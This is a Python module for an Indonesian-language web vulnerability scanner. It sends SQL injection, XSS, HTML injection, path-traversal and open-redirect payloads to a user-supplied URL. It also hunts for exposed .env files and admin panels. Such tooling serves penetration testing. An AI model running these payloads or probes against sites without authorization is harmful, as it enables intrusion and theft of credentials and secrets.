import requests
import time
from urllib.parse import urljoin, urlparse
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.live import Live

from utils import clear_screen

console = Console()

PAYLOADS = {
    "SQL Injection": ["'", '"', "1' OR '1'='1", "' OR 1=1 --", '" OR 1=1 --'],
    "XSS (Cross-Site Scripting)": [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>"
    ],
    "HTML Injection": [
        # Basic HTML Tags & Form Injection
        "<h1>Injected</h1>",
        "<h1><font color=red>HTML Injection</font></h1>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"http://example.com\">Click Here</a>",
        "<u>TestHTML</u>",
        # Attribute Breakout Tricks
        "\"><h1/id=test>Injected</h1>",
        "'\"><img src=x>"
    ],
    "LFI (Local File Inclusion)": [
        # Linux Basic & Deep Traversal
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        
        # Bypass & Encoding Tricks
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "../../../../etc/passwd%00",
        
        # Windows Path Traversal
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../boot.ini",
        "c:/windows/win.ini",
        
        # PHP Source Disclosure Wrapper
        "php://filter/convert.base64-encode/resource=index.php"
    ],
    "Open Redirect": [
        # Standard & Protocol Relative
        "https://google.com",
        "//google.com",
        "/\\google.com",
        "/https://google.com",
        
        # Bypass Tricks & Encodings
        "https://google.com%23",
        "//google.com/%2f..",
        "///google.com",
        "http:google.com",
        "https://google.com@target.com",
        
        # IP Encoding & Loopback / External Test
        "http://2130706433",  # Decimal IP
        "http://0730.01.01.01" # Octal IP
    ]
}

ADMIN_PATHS = [
    "/admin", "/admin/login", "/administrator", "/admin.php",
    "/admin/login.php", "/wp-admin", "/cpanel"
]

ENV_PATHS = [
    # 1. Standard Root & Common Backups
    ".env",
    ".env.local",
    ".env.bak",
    ".env.old",
    ".env.example",
    ".env.save",
    
    # 2. Production & Environment Variations
    ".env.production",
    ".env.dev",
    
    # 3. Common Subdirectories (Framework & API Stack)
    "api/.env",
    "backend/.env",
    "core/.env",
    "app/.env"
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "unclosed quotation mark after the character string",
    "mysql_fetch_array()", "pg_query()", "sqlite3::prepare()", "ora-00933"
]

LFI_SIGNATURES = [
    "root:x:0:0:", "boot loader", "[boot loader]", "cmdbin"
]

def check_env_leak(target_url):
    for path in ENV_PATHS:
        url = urljoin(target_url, path)
        try:
            res = requests.get(url, timeout=5, allow_redirects=False)
            if res.status_code == 200 and ("DB_" in res.text or "APP_" in res.text or "SECRET" in res.text or "repository" in res.text):
                return "VULNERABLE", f"File ditemukan: {url}"
        except requests.RequestException:
            continue
    return "SAFE", "Tidak ditemukan file .env yang bocor"

def check_admin_panel(target_url):
    found_panels = []
    for path in ADMIN_PATHS:
        url = urljoin(target_url, path)
        try:
            res = requests.get(url, timeout=5)
            if res.status_code in [200, 401, 403]:
                found_panels.append(url)
        except requests.RequestException:
            continue
    if found_panels:
        return "SUSPICIOUS", f"Panel ditemukan: {', '.join(found_panels[:3])}"
    return "SAFE", "Tidak ditemukan admin panel umum"

def check_sql_injection(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        return "INFO", "Bukan URL berbasis parameter (tidak ada ?param=val)"

    for payload in PAYLOADS["SQL Injection"]:
        test_quary = parsed.query
        for param in test_quary.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                test_quary = test_quary.replace(f"{k}={v}", f"{k}={v}{payload}")

        test_url = target_url.replace(parsed.query, test_quary)
        try:
            res = requests.get(test_url, timeout=5)
            if any(error in res.text.lower() for error in SQL_ERRORS):
                return "VULNERABLE", f"Rentan via payload: {payload}"
        except requests.RequestException:
            continue
    return "SAFE", "Tidak terditeksi indikasi SQL injection dasar"

def check_xss(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        return "INFO", "Bukan URL berbasis parameter (tidak ada ?param=val)"

    for payload in PAYLOADS["XSS (Cross-Site Scripting)"]:
        test_query = parsed.query
        for param in test_query.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                test_query = test_query.replace(f"{k}={v}", f"{k}={payload}")

        test_url = target_url.replace(parsed.query, test_query)
        try:
            res = requests.get(test_url, timeout=5)
            if payload in res.text:
                return "VULNERABLE", f"Payload terefleksi di HTML: {payload}"
        except requests.RequestException:
            continue
    return "SAFE", "Payload XSS tidak terefleksi kembali"

def check_html_injection(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        return "INFO", "Bukan URL berbasis parameter (tidak ada ?param=val)"

    for payload in PAYLOADS["HTML Injection"]:
        test_query = parsed.query
        for param in test_query.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                test_query = test_query.replace(f"{k}={v}", f"{k}={payload}")

        test_url = target_url.replace(parsed.query, test_query)
        try:
            res = requests.get(test_url, timeout=5)
            if payload in res.text:
                return "VULNERABLE", f"Tag HTML terefleksi tanpa sanitasi: {payload}"
        except requests.RequestException:
            continue
    return "SAFE", "Tag HTML berhasil di-escape atau disanitasi"

def check_lfi(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        return "INFO", "Bukan URL berbasis parameter (tidak ada ?param=val)"

    for payload in PAYLOADS["LFI (Local File Inclusion)"]:
        test_query = parsed.query
        for param in test_query.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                test_query = test_query.replace(f"{k}={v}", f"{k}={payload}")

        test_url = target_url.replace(parsed.query, test_query)
        try:
            res = requests.get(test_url, timeout=5)
            if any(sig in res.text for sig in LFI_SIGNATURES):
                return "VULNERABLE", f"File sistem terbaca dengan payload: {payload}"
        except requests.RequestException:
            continue
    return "SAFE", "Tidak terdeteksi pembacaan file lokal"

def check_open_redirect(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        return "INFO", "Bukan URl berbasis parameter (tidak ada ?param=val)"

    for payload in PAYLOADS["Open Redirect"]:
        test_query = parsed.query
        for param in test_query.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                test_query = test_query.replace(f"{k}={v}", f"{k}={payload}")

        test_url = target_url.replace(parsed.query, test_query)
        try:
            res = requests.get(test_url, timeout=5, allow_redirects=False)
            if res.status_code in [301, 302, 303, 307, 308]:
                location = res.headers.get('Location', '')
                if "google.com" in location:
                    return "VULNERABLE", f"Terjadi pengalihan luar ke: {location}"
        except requests.RequestException:
            continue
    return "SAFE", "Tidak terdeteksi pengalihan otomatis"

def run():
    while True:
        try:
            clear_screen()
            console.print("[bold green]=== Python Multi-Vulnerability Scanner ===[/bold green]\n")
            console.print("[bold yellow]Tekan Ctrl+C untuk kembali ke menu utama ToolsDong...[/bold yellow]")
            target = console.input("[bold yellow]Masukan URL / Domain Target (contoh: https://example.com / example.com): [/bold yellow]")
            if not target.startswith("http://") and not target.startswith("https://"):
                target = "https://" + target

            console.print(f"\n[bold green]Memulai pemindaian pada gawai target:[/bold green] [underline yellow]{target}[/underline yellow]\n")

            table = Table(title="Hasil Pemindaian Keamanan Web", show_lines=True)
            table.add_column("Kategori Tes", style="green", no_wrap=True)
            table.add_column("Status", justify="center")
            table.add_column("Keterangan / Detail Temuan", style="white")

            scanners = [
                (".env Leak Finder", check_env_leak),
                ("Admin Panel Finder", check_admin_panel),
                ("SQL Injection Scanner", check_sql_injection),
                ("XSS Scanner", check_xss),
                ("HTML Injection Scanner", check_html_injection),
                ("LFI Scanner", check_lfi),
                ("Open Redirect Scanner", check_open_redirect),
            ]

            with Live(table, refresh_per_second=4):
                for name, scan_func in scanners:
                    row_index = table.add_row(name, "[yellow]SCANNING...[/yellow]", "Sedang memperoses permintaan...")
                    status, detail = scan_func(target)
                    if status == "VULNERABLE":
                        status_str = "[bold red]VULNERABLE[/bold red]"
                    elif status == "SUSPICIOUS":
                        status_str = "[bold orange3]SUSPICIOUS[/bold orange3]"
                    elif status == "INFO":
                        status_str = "[bold blue]INFO[/bold blue]"
                    else:
                        status_str = "[bold green]SAFE[/bold green]"

                    table.columns[1]._cells[-1] = status_str
                    table.columns[2]._cells[-1] = detail

            console.print("\n[bold green]✔ Pemindaian Selesai![/bold green]")
            Prompt.ask("Tekan Enter untuk kembali...")
        except KeyboardInterrupt:
            console.print("\n[bold yellow][!] Keluar Dari Vulnerable Scan... Kembali ke Menu Utama.[/bold yellow]")
            time.sleep(1)
            break
